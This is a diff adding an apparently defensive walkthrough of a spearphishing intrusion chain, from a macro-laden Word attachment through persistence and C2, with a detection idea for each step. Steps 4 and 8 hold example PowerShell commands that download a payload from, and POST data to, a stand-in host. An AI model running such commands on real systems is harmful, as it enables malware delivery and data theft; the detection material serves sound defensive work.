@@ -1,0 +1,48 @@
+
+1. **Email Delivery**
+   - Application: Outlook
+   - User Action: User receives a spearphishing email from a spoofed address (e.g., admin@338).
+   - Key Artifacts: Email headers indicating spoofing, attachment named "Invoice.docx".
+   - Detection: Monitor for emails with suspicious "From" addresses and attachments with common spearphishing file types.
+
+2. **User Interaction**
+   - Application: Outlook
+   - User Action: User opens the email and clicks on the attachment.
+   - Key Artifacts: User clicks on "Enable Content" to allow macros.
+   - Detection: Monitor for user interactions with attachments and enabling macros.
+
+3. **Execution of Malicious Macro**
+   - Application: Microsoft Word
+   - User Action: The macro executes upon enabling content.
+   - Key Artifacts: Macro code that downloads a payload from a remote server.
+   - Detection: Monitor for processes spawned from Word that execute scripts or download files.
+
+4. **Payload Download**
+   - Application: PowerShell
+   - User Action: The macro triggers a PowerShell command to download a malicious executable.
+   - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Users\User\Downloads\payload.exe`
+   - Detection: Monitor for PowerShell commands that download executables from suspicious URLs.
+
+5. **Execution of Malicious Payload**
+   - Application: Windows Explorer
+   - User Action: User inadvertently executes the downloaded payload by double-clicking on it.
+   - Key Artifacts: Executable file located at `C:\Users\User\Downloads\payload.exe`.
+   - Detection: Monitor for execution of newly downloaded executables, especially from the Downloads folder.
+
+6. **Establishing Persistence**
+   - Application: Windows Task Scheduler
+   - User Action: The payload creates a scheduled task to ensure it runs on system startup.
+   - Key Artifacts: Scheduled task created with a command to execute the payload.
+   - Detection: Monitor for creation of new scheduled tasks that execute suspicious executables.
+
+7. **Command and Control Communication**
+   - Application: PowerShell
+   - User Action: The payload initiates a connection to a command and control (C2) server.
+   - Key Artifacts: Network traffic to a suspicious IP address (e.g., `http://malicious.com`).
+   - Detection: Monitor for outbound connections to known malicious IPs or domains.
+
+8. **Data Exfiltration**
+   - Application: PowerShell
+   - User Action: The payload collects sensitive data and sends it back to the C2 server.
+   - Key Artifacts: PowerShell command that uploads data (e.g., `Invoke-WebRequest -Uri http://malicious.com/exfil -Method POST -Body $data`).
+   - Detection: Monitor for PowerShell commands that send data to external servers, especially POST requests.
